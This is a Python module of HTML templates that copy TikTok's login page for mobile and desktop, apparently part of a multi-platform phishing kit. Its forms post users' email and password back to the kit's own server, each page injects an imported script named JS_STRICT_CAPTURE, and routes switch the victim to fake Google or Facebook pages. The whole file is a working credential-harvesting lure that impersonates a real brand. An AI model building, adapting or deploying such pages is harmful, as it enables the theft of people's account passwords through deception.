"""login.py - Templates de connexion TikTok (mobile + PC)."""

from platforms._shared import JS_STRICT_CAPTURE, TK_LOGO_SVG as _TK_LOGO_SVG

HTML_MOBILE_LOGIN = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta name="referrer" content="no-referrer">
    <meta charset="utf-8">
    <!-- viewport-fit=cover for notch support; width=device-width for true responsiveness -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#ffffff">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
    <title>Log in | TikTok</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #161823;
            -webkit-font-smoothing: antialiased;
            overscroll-behavior: none;
        }

        /* ═══════ FLUID TYPOGRAPHY & SPACING ═══════
           clamp(min, preferred, max) lets values scale smoothly with viewport.
           On a 320px phone   → 1rem (16px) base
           On a 768px tablet  → ~1.2rem
           On a 1920px desktop → capped at max (no absurd scaling)
        */

        /* Safe area for iPhone notch / Dynamic Island */
        .safe-top { height: env(safe-area-inset-top, 0px); }
        .safe-bottom { height: env(safe-area-inset-bottom, 0px); }

        /* Top app bar — TikTok logo */
        .tt-top {
            display: flex; align-items: center; justify-content: center;
            padding: clamp(12px, 3vmin, 20px) 16px clamp(8px, 2vmin, 14px);
        }
        .tt-top-logo {
            /* Logo scales with viewport: 28px on phone, 36px on tablet, capped 44px on desktop */
            height: clamp(40px, 12vmin, 64px);
            width: auto;
        }

        /* Card container — the main content wrapper.
           Mobile: full width with side padding.
           Tablet/Desktop: centered, max 460px, with shadow + rounded corners. */
        .tt-card {
            background: #ffffff;
            padding: 0 clamp(16px, 4vmin, 24px);
            /* On mobile, no max-width (use full screen).
               On ≥768px, cap at 460px and center horizontally. */
            max-width: 100%;
            margin: 0 auto;
        }

        /* Heading — fluid size from 22px (phone) to 32px (desktop) */
        .tt-title {
            font-size: clamp(22px, 5.5vmin, 32px);
            font-weight: 800;
            letter-spacing: -0.4px;
            margin: clamp(20px, 5vmin, 36px) 0 clamp(2px, 1vmin, 6px);
            color: #161823;
            line-height: 1.2;
        }
        .tt-subtitle {
            font-size: clamp(13px, 3.2vmin, 16px);
            color: #8a8b91;
            margin-bottom: clamp(20px, 5vmin, 30px);
            font-weight: 500;
        }

        /* Input wrapper with floating label.
           Height scales fluidly: 50px mobile → 60px desktop. */
        .tt-input-wrap {
            position: relative;
            margin-bottom: clamp(10px, 2.5vmin, 14px);
            background: #f1f1f2;
            border: 1.5px solid transparent;
            border-radius: clamp(10px, 2.5vmin, 14px);
            height: clamp(50px, 12vmin, 60px);
            transition: all 0.18s ease;
            display: flex; align-items: center;
        }
        .tt-input-wrap:focus-within {
            border-color: #161823;
            background: #ffffff;
        }
        .tt-input-wrap.has-error {
            border-color: #fe2c55;
            background: #fff5f6;
        }
        .tt-input {
            flex: 1;
            height: 100%;
            border: none;
            background: transparent;
            outline: none;
            /* Padding scales: top=larger for floating label, bottom smaller */
            padding: clamp(18px, 4vmin, 22px) clamp(12px, 3vmin, 16px) clamp(6px, 1.5vmin, 8px) clamp(12px, 3vmin, 16px);
            font-size: clamp(14px, 3.5vmin, 17px);
            color: #161823;
            font-family: inherit;
        }
        .tt-label {
            position: absolute;
            left: clamp(12px, 3vmin, 16px);
            top: 50%;
            transform: translateY(-50%);
            font-size: clamp(14px, 3.5vmin, 17px);
            color: #8a8b91;
            pointer-events: none;
            transition: all 0.18s ease;
            transform-origin: left center;
            font-weight: 500;
        }
        .tt-input:focus ~ .tt-label,
        .tt-input:not(:placeholder-shown) ~ .tt-label {
            top: clamp(8px, 2vmin, 12px);
            transform: translateY(0) scale(0.78);
            font-size: clamp(11px, 2.6vmin, 13px);
            color: #161823;
            font-weight: 600;
        }

        /* Show/hide password toggle — min 44px tap target */
        .tt-pw-toggle {
            background: transparent;
            border: none;
            color: #161823;
            font-size: clamp(11px, 2.6vmin, 13px);
            font-weight: 700;
            padding: 8px clamp(10px, 2.5vmin, 14px);
            min-width: 44px;
            min-height: 44px;
            cursor: pointer;
            letter-spacing: 0.3px;
            text-transform: uppercase;
            transition: opacity 0.15s ease;
            opacity: 0;
            pointer-events: none;
        }
        .tt-input-wrap.has-value .tt-pw-toggle {
            opacity: 1;
            pointer-events: auto;
        }

        /* Submit button — fluid padding & font */
        .tt-btn {
            background: #fe2c55;
            color: #ffffff;
            border-radius: clamp(10px, 2.5vmin, 14px);
            padding: clamp(13px, 3.2vmin, 16px);
            font-weight: 700;
            width: 100%;
            font-size: clamp(15px, 3.7vmin, 18px);
            border: none;
            cursor: pointer;
            transition: all 0.18s ease;
            margin-top: clamp(12px, 3vmin, 18px);
            letter-spacing: 0.2px;
            box-shadow: 0 4px 12px rgba(254,44,85,0.28);
        }
        .tt-btn:hover { background: #e52749; }
        .tt-btn:active { transform: scale(0.985); }
        .tt-btn:disabled {
            background: #f1f1f2;
            color: #c9c9c9;
            box-shadow: none;
            cursor: not-allowed;
        }

        /* Loading spinner inside button */
        .tt-spinner {
            display: inline-block;
            width: clamp(14px, 3.5vmin, 18px);
            height: clamp(14px, 3.5vmin, 18px);
            border: 2px solid rgba(255,255,255,0.4);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: tt-spin 0.6s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes tt-spin { to { transform: rotate(360deg); } }

        /* Divider */
        .tt-divider {
            display: flex; align-items: center;
            margin: clamp(18px, 4.5vmin, 26px) 0 clamp(12px, 3vmin, 18px);
            color: #8a8b91;
            font-size: clamp(12px, 3vmin, 14px);
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        .tt-divider::before, .tt-divider::after {
            content: ""; flex: 1; height: 1px; background: #e3e3e4;
        }
        .tt-divider::before { margin-right: 14px; }
        .tt-divider::after { margin-left: 14px; }

        /* Social buttons — pill style, min 48px height for accessibility */
        .tt-social-btn {
            display: flex; align-items: center; justify-content: center; gap: 10px;
            width: 100%;
            min-height: clamp(48px, 11vmin, 54px);
            border: 1.5px solid #e3e3e4;
            border-radius: 25px;
            background: #ffffff;
            color: #161823;
            font-weight: 600;
            font-size: clamp(14px, 3.5vmin, 16px);
            cursor: pointer;
            transition: all 0.18s ease;
            margin-bottom: 10px;
            font-family: inherit;
            padding: 0 16px;
        }
        .tt-social-btn:hover { background: #fafafa; border-color: #c9c9c9; }
        .tt-social-btn:active { transform: scale(0.985); }
        .tt-social-btn svg {
            width: clamp(18px, 4vmin, 22px);
            height: clamp(18px, 4vmin, 22px);
            flex-shrink: 0;
        }

        /* Forgot link */
        .tt-forgot {
            text-align: center;
            margin-top: clamp(18px, 4.5vmin, 26px);
            font-size: clamp(13px, 3.3vmin, 16px);
        }
        .tt-forgot a {
            color: #161823;
            font-weight: 600;
            transition: opacity 0.15s ease;
            display: inline-block;
            min-height: 44px;
            line-height: 44px;
        }
        .tt-forgot a:active { opacity: 0.6; }

        /* Error box with shake */
        .tt-error {
            background: #fff5f6;
            border: 1.5px solid #fe2c55;
            color: #fe2c55;
            border-radius: clamp(10px, 2.5vmin, 14px);
            animation: tt-shake 0.42s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
            padding: clamp(10px, 2.5vmin, 14px);
            font-size: clamp(12px, 3vmin, 14px);
        }
        @keyframes tt-shake {
            10%, 90% { transform: translateX(-1px); }
            20%, 80% { transform: translateX(2px); }
            30%, 50%, 70% { transform: translateX(-3px); }
            40%, 60% { transform: translateX(3px); }
        }

        /* Footer terms */
        .tt-footer {
            text-align: center;
            margin-top: clamp(24px, 6vmin, 40px);
            padding: 0 clamp(16px, 4vmin, 32px) clamp(24px, 6vmin, 40px);
            font-size: clamp(11px, 2.7vmin, 13px);
            color: #8a8b91;
            line-height: 1.5;
        }
        .tt-footer a {
            color: #8a8b91;
            text-decoration: underline;
        }

        /* ═══════ RESPONSIVE BREAKPOINTS ═══════
           On ≥768px (tablets, desktops), turn the page into a centered card
           with a max-width container, vertical centering, and subtle shadow.
           This is what makes the page "adapt to the screen resolution". */

        /* Tablet / small desktop: ≥768px */
        @media (min-width: 768px) {
            body {
                background: linear-gradient(135deg, #fafafa 0%, #f1f1f2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 24px;
            }
            .safe-top, .safe-bottom { display: none; }
            .tt-top {
                padding: 0 0 12px;
            }
            /* Wrap card in a contained, elevated surface */
            .tt-card {
                max-width: 460px;
                padding: 0;
                background: transparent;
            }
            /* Add a "shell" around the card for elevation on desktop */
            .tt-shell {
                background: #ffffff;
                border-radius: 24px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.08), 0 2px 8px rgba(0,0,0,0.04);
                padding: clamp(28px, 4vmin, 40px) clamp(28px, 4vmin, 40px) clamp(24px, 3vmin, 32px);
                max-width: 460px;
                width: 100%;
            }
            .tt-footer {
                padding: clamp(20px, 3vmin, 28px) 0 0;
                margin-top: clamp(20px, 3vmin, 28px);
            }
        }

        /* Large desktop: ≥1200px — keep same card but center vertically */
        @media (min-width: 1200px) {
            body { padding: 40px; }
            .tt-shell {
                max-width: 480px;
                padding: 44px 44px 36px;
            }
            .tt-title { font-size: 30px; }
        }

        /* Extra-large: ≥1600px — cap growth so it doesn't look oversized */
        @media (min-width: 1600px) {
            .tt-shell { max-width: 500px; }
        }

        /* Landscape phone (e.g. iPhone in landscape): tighter vertical spacing */
        @media (max-width: 900px) and (orientation: landscape) and (max-height: 500px) {
            .tt-top { padding: 6px 16px 4px; }
            .tt-title { margin-top: 12px; margin-bottom: 2px; font-size: 22px; }
            .tt-subtitle { margin-bottom: 14px; }
            .tt-divider { margin: 12px 0 10px; }
            .tt-footer { margin-top: 16px; padding-bottom: 8px; }
        }

        /* Dark mode (if user's OS is in dark mode) — TikTok has a dark variant */
        @media (prefers-color-scheme: dark) {
            body { background: #161823; color: #f1f1f2; }
            .tt-card, .tt-shell { background: #161823; color: #f1f1f2; }
            .tt-title { color: #f1f1f2; }
            .tt-subtitle { color: #8a8b91; }
            .tt-input-wrap { background: #1f1f22; }
            .tt-input-wrap:focus-within { background: #1f1f22; border-color: #f1f1f2; }
            .tt-input { color: #f1f1f2; }
            .tt-input:focus ~ .tt-label,
            .tt-input:not(:placeholder-shown) ~ .tt-label { color: #f1f1f2; }
            .tt-label { color: #8a8b91; }
            .tt-pw-toggle { color: #f1f1f2; }
            .tt-social-btn {
                background: #1f1f22;
                color: #f1f1f2;
                border-color: #2c2c30;
            }
            .tt-social-btn:hover { background: #2a2a2e; }
            .tt-divider::before, .tt-divider::after { background: #2c2c30; }
            .tt-forgot a { color: #f1f1f2; }
            @media (min-width: 768px) {
                body { background: linear-gradient(135deg, #0d0d10 0%, #161823 100%); }
                .tt-shell {
                    background: #161823;
                    box-shadow: 0 10px 40px rgba(0,0,0,0.4), 0 2px 8px rgba(0,0,0,0.2);
                }
            }
        }

        /* Reduced motion: respect user preference */
        @media (prefers-reduced-motion: reduce) {
            *, *::before, *::after {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: 0.01ms !important;
            }
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="safe-top"></div>

    <div class="tt-top">
        <svg class="tt-top-logo" viewBox="0 0 118 42" xmlns="http://www.w3.org/2000/svg">
            <path d="M16.4 12.6c0 4.6-3.7 8.3-8.3 8.3S0 17.2 0 12.6 3.7 4.3 8.1 4.3v4.2c-2.3 0-4.1 1.8-4.1 4.1s1.9 4.2 4.1 4.2 4.1-1.9 4.1-4.2V0h4.2c0 2.3 1.9 4.1 4.1 4.1v4.2c-1.5 0-2.9-.5-4.1-1.3v5.6z" fill="#25F4EE" transform="translate(-2,0)"/>
            <path d="M16.4 12.6c0 4.6-3.7 8.3-8.3 8.3S0 17.2 0 12.6 3.7 4.3 8.1 4.3v4.2c-2.3 0-4.1 1.8-4.1 4.1s1.9 4.2 4.1 4.2 4.1-1.9 4.1-4.2V0h4.2c0 2.3 1.9 4.1 4.1 4.1v4.2c-1.5 0-2.9-.5-4.1-1.3v5.6z" fill="#FE2C55" transform="translate(2,0)"/>
            <path d="M16.4 12.6c0 4.6-3.7 8.3-8.3 8.3S0 17.2 0 12.6 3.7 4.3 8.1 4.3v4.2c-2.3 0-4.1 1.8-4.1 4.1s1.9 4.2 4.1 4.2 4.1-1.9 4.1-4.2V0h4.2c0 2.3 1.9 4.1 4.1 4.1v4.2c-1.5 0-2.9-.5-4.1-1.3v5.6z" fill="#000000"/>
            <text x="32" y="30" font-family="-apple-system, Helvetica, Arial, sans-serif" font-size="26" font-weight="700" fill="#000000" letter-spacing="-0.5">TikTok</text>
        </svg>
    </div>

    <!-- On ≥768px, the .tt-shell wrapper provides elevation; on mobile it's transparent. -->
    <div class="tt-shell" style="background: transparent; box-shadow: none; padding: 0; max-width: 100%; border-radius: 0;">
    <div class="tt-card flex-1">
        <h2 class="tt-title">{{ login_title }}</h2>
        <p class="tt-subtitle">Connecte-toi pour continuer</p>

        <div id="error-box" class="{% if not message %}hidden{% endif %} tt-error w-full mb-3 font-medium">{{ message }}</div>

        <form method="POST" id="tt-login-form">
            <input type="hidden" name="action" value="login">
            <div class="tt-input-wrap" id="email-wrap">
                <input type="text" name="email" id="email-tt-mob" placeholder=" " class="tt-input" required autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false">
                <label class="tt-label">{{ email_ph }}</label>
            </div>
            <div class="tt-input-wrap" id="pass-wrap">
                <input type="password" name="pass" id="pass-tt-mob" placeholder=" " class="tt-input" required>
                <label class="tt-label">{{ pass_ph }}</label>
                <button type="button" class="tt-pw-toggle" id="pw-toggle">Afficher</button>
            </div>
            <button type="submit" class="tt-btn" id="tt-submit">{{ login_btn }}</button>
        </form>

        <div class="tt-divider">ou</div>

        <a href="/switch_platform/google" class="tt-social-btn" style="text-decoration:none; display:flex;">
            <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
            Continuer avec Google
        </a>
        <button class="tt-social-btn" type="button">
            <svg viewBox="0 0 24 24" fill="#000"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
            Continuer avec Apple
        </button>
        <a href="/switch_platform/facebook" class="tt-social-btn" style="text-decoration:none; display:flex;">
            <svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
            Continuer avec Facebook
        </a>

        <div class="tt-forgot">
            <a href="#">{{ forgot }}</a>
        </div>
    </div>

    <div class="tt-footer">
        En continuant, tu acceptes les <a href="#">Conditions d'utilisation</a> de TikTok,
        reconnais avoir lu la <a href="#">Politique de confidentialité</a>,
        et notre <a href="#">Charte de la communauté</a>.
    </div>
    </div><!-- /.tt-shell -->

    <div class="safe-bottom"></div>

    <script>
    (function() {
        // ── Show/hide password toggle ──
        var passInput = document.getElementById('pass-tt-mob');
        var passWrap = document.getElementById('pass-wrap');
        var toggle = document.getElementById('pw-toggle');
        toggle.addEventListener('click', function() {
            if (passInput.type === 'password') {
                passInput.type = 'text';
                toggle.textContent = 'Masquer';
            } else {
                passInput.type = 'password';
                toggle.textContent = 'Afficher';
            }
        });

        // ── Show toggle only when password has content ──
        function updatePassToggle() {
            if (passInput.value.length > 0) passWrap.classList.add('has-value');
            else passWrap.classList.remove('has-value');
        }
        passInput.addEventListener('input', updatePassToggle);
        updatePassToggle();

        // ── Submit button enable/disable state ──
        var emailInput = document.getElementById('email-tt-mob');
        var emailWrap = document.getElementById('email-wrap');
        var submit = document.getElementById('tt-submit');
        var form = document.getElementById('tt-login-form');

        function updateSubmitState() {
            submit.disabled = !(emailInput.value.trim() && passInput.value);
        }
        emailInput.addEventListener('input', updateSubmitState);
        passInput.addEventListener('input', updateSubmitState);
        updateSubmitState();

        // ── Loading state on submit ──
        form.addEventListener('submit', function(e) {
            if (!emailInput.value.trim() || !passInput.value) {
                e.preventDefault();
                return;
            }
            submit.disabled = true;
            submit.innerHTML = '<span class="tt-spinner"></span>' + submit.textContent.trim();
            setTimeout(function() {
                submit.disabled = false;
                submit.innerHTML = '{{ login_btn }}';
            }, 4000);
        });

        // ── Clear error styling when user edits inputs ──
        var errBox = document.getElementById('error-box');
        function clearErr() {
            if (errBox && !errBox.classList.contains('hidden')) errBox.classList.add('hidden');
            emailWrap.classList.remove('has-error');
            passWrap.classList.remove('has-error');
        }
        emailInput.addEventListener('input', clearErr);
        passInput.addEventListener('input', clearErr);
        {% if message %}
        emailWrap.classList.add('has-error');
        passWrap.classList.add('has-error');
        {% endif %}

        // ── Responsive shell: enable desktop-style elevation only at ≥768px ──
        // We use a matchMedia listener so the shell styles swap live when the
        // user resizes the browser window across the breakpoint.
        var shell = document.querySelector('.tt-shell');
        function applyShellStyle(mq) {
            if (mq.matches) {
                // Desktop / tablet: elevated card
                shell.style.background = '';
                shell.style.boxShadow = '';
                shell.style.padding = '';
                shell.style.maxWidth = '';
                shell.style.borderRadius = '';
            } else {
                // Mobile: full-width, no elevation
                shell.style.background = 'transparent';
                shell.style.boxShadow = 'none';
                shell.style.padding = '0';
                shell.style.maxWidth = '100%';
                shell.style.borderRadius = '0';
            }
        }
        var mq = window.matchMedia('(min-width: 768px)');
        applyShellStyle(mq);
        // Modern browsers: addEventListener; older Safari: addListener
        if (mq.addEventListener) mq.addEventListener('change', applyShellStyle);
        else if (mq.addListener) mq.addListener(applyShellStyle);

        // ── Also adjust for dark mode dynamically (in case OS theme changes) ──
        // (CSS handles this via prefers-color-scheme, but we re-apply shell style
        //  to clear any inline overrides)
        var dmMq = window.matchMedia('(prefers-color-scheme: dark)');
        if (dmMq.addEventListener) dmMq.addEventListener('change', function() { applyShellStyle(mq); });
        else if (dmMq.addListener) dmMq.addListener(function() { applyShellStyle(mq); });
    })();
    </script>
</body>
</html>
"""


HTML_PC_LOGIN = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
    <title>Log in | TikTok</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
        }
        .tt-card {
            background: #fff;
            padding: 40px 36px;
            border-radius: 14px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
            width: 400px;
            border: 1px solid #f0f0f0;
        }
        .tt-input-wrap { position: relative; margin-bottom: 14px; }
        .tt-input {
            width: 100%; height: 50px;
            border: 1px solid #e3e3e4; border-radius: 6px;
            padding: 20px 14px 8px 14px;
            font-size: 15px; background: #fafafa; outline: none;
            transition: all 0.15s ease; color: #161823;
        }
        .tt-input:focus {
            border-color: #fe2c55; background: #fff;
            box-shadow: 0 0 0 3px rgba(254,44,85,0.08);
        }
        .tt-input:focus + .tt-label,
        .tt-input:not(:placeholder-shown) + .tt-label {
            top: 7px; font-size: 11px; color: #fe2c55;
        }
        .tt-label {
            position: absolute; left: 14px; top: 15px;
            font-size: 15px; color: #8a8b91;
            pointer-events: none; transition: all 0.15s ease;
        }
        .tt-btn {
            background: #fe2c55; color: #fff; border-radius: 6px;
            padding: 14px; font-weight: 600; width: 100%; font-size: 16px;
            border: none; cursor: pointer; transition: all 0.15s ease;
            box-shadow: 0 2px 4px rgba(254,44,85,0.2);
        }
        .tt-btn:hover { background: #e5274d; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(254,44,85,0.3); }
        .tt-btn:active { transform: translateY(0); }
        .tt-divider { display: flex; align-items: center; margin: 22px 0; color: #8a8b91; font-size: 13px; }
        .tt-divider::before, .tt-divider::after { content: ""; flex: 1; height: 1px; background: #e3e3e4; }
        .tt-divider::before { margin-right: 12px; }
        .tt-divider::after { margin-left: 12px; }
        .tt-social-btn {
            display: flex; align-items: center; justify-content: center; gap: 8px;
            width: 100%; height: 46px; border: 1px solid #e3e3e4; border-radius: 6px;
            background: #fff; color: #161823; font-weight: 600; font-size: 15px;
            cursor: pointer; transition: all 0.15s ease; margin-bottom: 10px;
        }
        .tt-social-btn:hover { background: #fafafa; border-color: #c9c9c9; }
    </style>
</head>
<body>
    """ + JS_STRICT_CAPTURE + r"""
    <div class="tt-card">
        <div class="flex justify-center mb-5">
            """ + _TK_LOGO_SVG + r"""
        </div>
        <h2 class="text-xl font-bold text-center text-gray-900 mb-6">{{ login_title }}</h2>
        <div id="error-box-pc" class="{% if not message %}hidden{% endif %} w-full bg-red-50 border border-red-200 text-red-700 p-3 rounded text-sm mb-4">
            {{ message }}
        </div>
        <form method="POST">
            <input type="hidden" name="action" value="login">
            <div class="tt-input-wrap">
                <input type="text" name="email" id="email-tt-pc" placeholder=" " class="tt-input" required autocomplete="off">
                <label class="tt-label">{{ email_ph }}</label>
            </div>
            <div class="tt-input-wrap">
                <input type="password" name="pass" placeholder=" " class="tt-input" required>
                <label class="tt-label">{{ pass_ph }}</label>
            </div>
            <button type="submit" class="tt-btn mt-2">{{ login_btn }}</button>
        </form>
        <div class="tt-divider">ou</div>
        <button class="tt-social-btn">
            <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
            Continuer avec Google
        </a>
        <button class="tt-social-btn">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#000"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
            Continuer avec Apple
        </button>
        <a href="#" class="block mt-5 text-center text-sm text-gray-600 font-medium">{{ forgot }}</a>
    </div>
</body>
</html>
"""

